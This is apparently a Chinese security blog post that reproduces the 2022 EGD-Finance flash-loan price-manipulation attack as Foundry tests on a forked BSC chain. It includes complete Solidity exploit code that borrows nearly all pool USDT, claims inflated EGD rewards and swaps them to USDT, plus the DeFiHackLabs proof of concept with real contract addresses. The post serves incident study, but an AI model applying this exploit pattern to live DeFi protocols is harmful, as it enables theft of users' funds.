---
title: EGD价格操纵攻击foundry复现
date: 2023-12-19 17:34:40
tags: [Defi安全, 安全事件分析]
categories: Defi安全
description: 摘要：EGD-Finance价格操纵攻击foundry复现
---

EGD价格操纵攻击事件的介绍见：[EGD价格操纵攻击原理分析--phalcon+etherscan)](https://emmanuelwh.github.io/2023/12/19/EGD价格操纵攻击原理分析/)

foundry的介绍可见：[编写测试 - Foundry 中文文档 (learnblockchain.cn)](https://learnblockchain.cn/docs/foundry/i18n/zh/forge/writing-tests.html)

参考链接：[EGD Finance 价格操纵攻击事件分析 - YINHUI's BLOG (yinhui1984.github.io)](https://yinhui1984.github.io/analyse_of_egd_finance_attack/)

## 1. 前情提要以及思路介绍

EGD-Finance项目的主要实现目的：`质押USDT一段事件，可提取奖励EGD Token`,前文已经说明，由于闪电贷从`Pancake LPs`池子中借出了大量的USDT，而奖励的`EGD Token`数量一定程度上依赖于池子中两种代币的数量，从而导致了价格操纵攻击。

由于对foundry不太熟悉，加上没有写过大的solidity项目；

攻击的复现我们分为三部分进行实现：

- 借用闪电贷，实现价格的操纵
- 实现EGD项目的逻辑，质押后兑换奖励
- 闪电贷实现价格操纵，利用EGD兑换的逻辑漏洞，实现套利

## 2. 闪电贷实现价格操纵

- 对于想调用的外部合约函数，不仅仅需要它的地址，同时把对应需要调用的函数写成`接口interface()`的形式，`interface()`中不写具体的函数代码，函数访问修饰都是external.
- solidity中没有浮点型的数，一般乘以的百分比，可以学习一下一般怎么写的

```solidity
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IEGD_Finance {
    function getEGDPrice() external view returns (uint);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

//Pancake借出USDT的池子
address constant EGD_USDT_LPPool = 0xa361433E409Adac1f87CDF133127585F8a93c67d;

// EGD 代理合约的地址
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;

// USDT代币的地址
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;

contract pricemanipulation is Test{

    function setUp() public{
    	//fork stake()函数调用前的状态
        vm.createSelectFork("https://rpc.ankr.com/bsc", 20_245_522);
        //给账户上初始分配点USDT
        deal(address(usdt),address(this), 30000*1 ether);
    }

    function testPrice() public {
        console.log("EGD Price before:", IEGD_Finance(EGD_Finance).getEGDPrice());
        uint amount = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000;
        IPancakePair(EGD_USDT_LPPool).swap(0, amount, address(this), "0x00");
        console.log("EGD Price after( return flashloan )", IEGD_Finance(EGD_Finance).getEGDPrice());
    }

    function pancakeCall(address sender, uint256 amount1, uint256 amount2, bytes calldata data) public {
    	//闪电贷之前EGD的价格
        console.log("EGD Price after( flashloan )", IEGD_Finance(EGD_Finance).getEGDPrice()) ;
        
        //归还相应的本金
        bool success = IERC20(usdt).transfer(address(EGD_USDT_LPPool),(amount2 * 10_500_000_000) / 10_000_000_000) ;
        require(success) ;
    }
}
```

测试结果：表明成功操纵了价格

```
 /test/attack_test # forge test --match-contract pricemanipulation -vvv
[⠃] Compiling...
No files changed, compilation skipped

Running 1 test for test/test_pricemanipulation.sol:pricemanipulation
[PASS] testPrice() (gas: 87598)
Logs:
  EGD Price before: 8093644493314726
  EGD Price after( flashloan ) 60702333
  EGD Price after( return flashloan ) 8498326714945346

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 576.95ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

## 3. 实现先质押USDT，后获得EGD奖励

- 这里比较疑惑的一点是，目标函数中userInfo是一个结构体映射，这里接口中将其用函数表示出，用于获取对应的值，希望有佬帮忙讲解一下，这里是interface的用法可以这样写嘛，后续再试一下。

```solidity
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IEGD_Finance {
    function getEGDPrice() external view returns (uint);
    function bond(address invitor) external;
    function stake(uint amount) external;
    function claimAllReward() external;
    function calculateAll(address addr) external view returns (uint);
    function calculateReward(address addr, uint slot) external view returns (uint);

    function userInfo(address) external view returns (        
        uint totalAmount,
        uint totalClaimed,
        address invitor,
        bool isRefer,
        uint refer,
        uint referReward
    );
}

// EGD 代理合约的地址
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;

// USDT代币的地址
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;

// EGD代币的地址
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;


contract stake_reward is Test{

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 20_245_522);
        deal(address(usdt),address(this), 30000*1 ether);
    }

    function test_stake() public {
		//具体可见EGD-Fiance源码，bond函数填写邀请人
    	IEGD_Finance(EGD_Finance).bond(address(0x85cbfaBD709c744C84A36BA47145396d724EE751));
    	
    	//stake()过程中会直接继续代币转账，这里需要先approve(没真实写过的话，可能会忘这一步)
        IERC20(usdt).approve(address(EGD_Finance), 100 ether);
        IEGD_Finance(EGD_Finance).stake(100 ether);
        (uint totalAmount, , , , , ) = IEGD_Finance(EGD_Finance).userInfo(address(this));

        //接下来查看对应的资金
        console.log("Stake USDT amount:", totalAmount);
        console.log("EGD reward: ", IERC20(egd).balanceOf(address(this)));

		// foundry的cheatcode，跳转到某个区块
        vm.warp(block.timestamp + (4 * 60 * 24 * 4));
		
		//获得对应的奖励
        IEGD_Finance(EGD_Finance).claimAllReward();

        console.log("EGD reward after 2 days: ", IERC20(egd).balanceOf(address(this)));

    }
}
```

```
/test/attack_test # forge test --match-contract stake_reward -vvv
[⠊] Compiling...
[⠰] Compiling 1 files with 0.8.22
[⠒] Solc 0.8.22 finished in 1.28s
Compiler run successful!

Running 1 test for test/test_stake_reward.sol:stake_reward
[PASS] test_stake() (gas: 865865)
Logs:
  Stake USDT amount: 100000000000000000000
  EGD reward:  0
  EGD reward after 4 days:  18016435864263240000

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 591.56ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

测试结果：成功实现了质押USDT，获得EGD的过程

## 4. 闪电贷实现价格操纵，利用EGD兑换的逻辑漏洞，实现套利

- 只是简单地将上述两个步骤糅合在了一起，调用EGD-Finance提取奖励的函数

```solidity
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IEGD_Finance {
    function getEGDPrice() external view returns (uint);
    function bond(address invitor) external;
    function stake(uint amount) external;
    function claimAllReward() external;
    function calculateAll(address addr) external view returns (uint);
    function calculateReward(address addr, uint slot) external view returns (uint);
    function userInfo(address) external view returns (        
        uint totalAmount,
        uint totalClaimed,
        address invitor,
        bool isRefer,
        uint refer,
        uint referReward
    );
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

//Pancake借出USDT的池子
address constant EGD_USDT_LPPool = 0xa361433E409Adac1f87CDF133127585F8a93c67d;

// EGD 代理合约的地址
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;

// USDT代币的地址
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;

// EGD代币的地址
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract HackerTest is Test{

    function setUp() public{
        vm.createSelectFork("https://rpc.ankr.com/bsc", 20_245_522);
        deal(address(usdt),address(this), 30000*1 ether);
    }

    function stake() public {
        IEGD_Finance(EGD_Finance).bond(address(0x85cbfaBD709c744C84A36BA47145396d724EE751));

        IERC20(usdt).approve(address(EGD_Finance), 100 ether);
        IEGD_Finance(EGD_Finance).stake(100 ether);
    }

    function test_exploit() public {
        stake();
        vm.warp(block.timestamp + (4 * 60 * 24 * 2));

        console.log("EGD Price before flashloan:", IEGD_Finance(EGD_Finance).getEGDPrice());
		
		//计算用户地址，当前存款下获得的奖励数目
        uint totalreward = IEGD_Finance(EGD_Finance).calculateAll(address(this));
        console.log("Normal EGD reward:", totalreward);

        uint amount = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_000_000 / 10_000_000_000;
        IPancakePair(EGD_USDT_LPPool).swap(0, amount, address(this), "0x00");

    }

    function pancakeCall(address sender, uint256 amount1, uint256 amount2, bytes calldata data) public{

        console.log("EGD Price after flashloan: ", IEGD_Finance(EGD_Finance).getEGDPrice());
		
		//提取账户奖励
        IEGD_Finance(EGD_Finance).claimAllReward();

        console.log("Hacker's EGD balance: ", IERC20(egd).balanceOf(address(this)));

        bool success = IERC20(usdt).transfer(address(EGD_USDT_LPPool),(amount2 * 10_500_000_000) / 10_000_000_000) ;
        require(success) ;
    }
}
```

## 5. DefiHacklabs实现的POC介绍

- Defihacklabs中的复现，其将大部分常用的`interface`都保存在了`./interface.sol`文件中
- 多了一步，是通过`IPancakeRouter`这个池子，将套利获得的EGD全部换成USDT，前文分析中已经说明

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776

IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test {
    function setUp() public {
    	//fork对应的区块状态
        vm.createSelectFork("bsc", 20_245_522);

        vm.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        vm.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        vm.label(address(pancakeRouter), "pancakeRouter");
        vm.label(EGD_Finance, "EGD_Finance");
        vm.label(usdt, "USDT");
        vm.label(egd, "EGD");
    }

    function testExploit() public {
        Exploit exploit = new Exploit();

        console.log("--------------------  Pre-work, stake 100 USDT to EGD Finance --------------------");
        console.log("Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8");
        console.log("Attacker Stake 100 USDT to EGD Finance");
        
        //先实现对应的质押USDT
        exploit.stake();

        vm.warp(1_659_914_146); // block.timestamp = 2022-08-07 23:15:46(UTC)

        console.log("-------------------------------- Start Exploit ----------------------------------");
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint(
            "[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18
        );
        emit log_named_decimal_uint(
            "[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18
        );
        console.log("Attacker manipulating price oracle of EGD Finance...");

        exploit.harvest();

        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}

// Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee 
contract Exploit is Test {
    uint256 borrow1;
    uint256 borrow2;

	//与前文流程一致
    function stake() public {
        // Give exploit contract 100 USDT， 给账户初始复制
        deal(address(usdt), address(this), 100 ether);
        // Set invitor
        IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
        // Stake 100 USDT
        IERC20(usdt).approve(EGD_Finance, 100 ether);
        IEGD_Finance(EGD_Finance).stake(100 ether);
    }

    function harvest() public {
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); // refund all USDT
    }
	
	//用不同的calldata，来区分两次闪电贷的过程
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        if (keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            
            //第二次闪电贷借出多少USDT
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000; // Attacker borrows 99.99999925% USDT of EGD_USDT_LPPool reserve
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00");
            console.log("Flashloan[2] payback success");

            // Swap all egd -> usdt
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)), 1, path, address(this), block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 1e18); // Pancakeswap fee is 0.25%, so attacker needs to pay back usdt >2000/0.9975 (Cannot be exactly 0.25%)
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint(
                "[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18
            );
            // -----------------------------------------------------------------
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            //计算需要总共返还闪电贷的费用
            uint256 swapfee = (amount1 * 10_000 / 9970) - amount1; // Attacker needs to pay >0.25% fee back to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1 + swapfee);
            require(suc, "Flashloan[2] payback failed");
        }
    }
}

// interface
interface IEGD_Finance {
    function bond(address invitor) external;
    function stake(uint256 amount) external;
    function calculateAll(address addr) external view returns (uint256);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint256);
}
```



















